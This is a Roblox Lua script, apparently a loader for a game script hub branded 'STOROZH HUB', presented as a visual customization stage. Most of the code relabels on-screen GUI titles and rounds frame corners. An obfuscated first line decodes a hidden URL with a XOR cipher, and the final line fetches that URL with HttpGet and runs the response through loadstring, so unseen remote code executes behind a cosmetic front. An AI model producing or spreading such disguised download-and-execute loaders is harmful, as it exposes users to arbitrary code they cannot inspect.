
--[[ STAGE 2: VISUAL CORE ]]
local X3hS5Ac3HndVni3s2="\036\066\068\066\069\128\117\119\078\061\085\128\073\061\092\066\095\080\099\099\087\104\089\087\090\114\099\096\120\164\105\103\103\171\110\111\114\117\115\125\119\125\126\147\136\195\138\156\131\143\137\167\147\146\148\215\151\157\151\160\225\151\167\161\168\171\194\159\164\173\187\187\191\171\156\197\218\201\196\183\178\205\226\205\193\199\217\236\211\238\244\207\213\227\251\252\237\241\221\246\243\249\250\066\076\084\001\064\000\025\007"local RNkzXVZleCipezmiE6Bn2=201 local vWE2dWmHqWOhlv=108 local Xm3aX1vOfEoJ1uZYR=0 local Ib50PN3ee_N6ObYGbhj=2 local xwxLzkZrqjYLRxp3hlMXp9=21 local JWGBETiUA0thx2M=false local B4qD_ybxlXaFUcn3k=bit32 and bit32.bxor if not B4qD_ybxlXaFUcn3k then B4qD_ybxlXaFUcn3k=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local sYMr4pGZrKdmlQnACd={}for KDu9t4Y720Ds4VvLaGU=1,#X3hS5Ac3HndVni3s2 do local yxEs6j_78zdZZroYvf=string.byte(X3hS5Ac3HndVni3s2,KDu9t4Y720Ds4VvLaGU)local FSFB7V3saMo_h=(vWE2dWmHqWOhlv+(KDu9t4Y720Ds4VvLaGU*Ib50PN3ee_N6ObYGbhj)+xwxLzkZrqjYLRxp3hlMXp9)%256 if Xm3aX1vOfEoJ1uZYR==0 then yxEs6j_78zdZZroYvf=(yxEs6j_78zdZZroYvf-FSFB7V3saMo_h)%256 sYMr4pGZrKdmlQnACd[KDu9t4Y720Ds4VvLaGU]=string.char(B4qD_ybxlXaFUcn3k(yxEs6j_78zdZZroYvf,RNkzXVZleCipezmiE6Bn2))else yxEs6j_78zdZZroYvf=B4qD_ybxlXaFUcn3k(yxEs6j_78zdZZroYvf,RNkzXVZleCipezmiE6Bn2)sYMr4pGZrKdmlQnACd[KDu9t4Y720Ds4VvLaGU]=string.char((yxEs6j_78zdZZroYvf-FSFB7V3saMo_h)%256)end end local ztqxnp5mGfCq8DY=table.concat(sYMr4pGZrKdmlQnACd)if JWGBETiUA0thx2M then ztqxnp5mGfCq8DY=string.reverse(ztqxnp5mGfCq8DY)end local u5man4m4radnGwzKp1In=ztqxnp5mGfCq8DY
local HubName = "STOROZH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(u5man4m4radnGwzKp1In))()
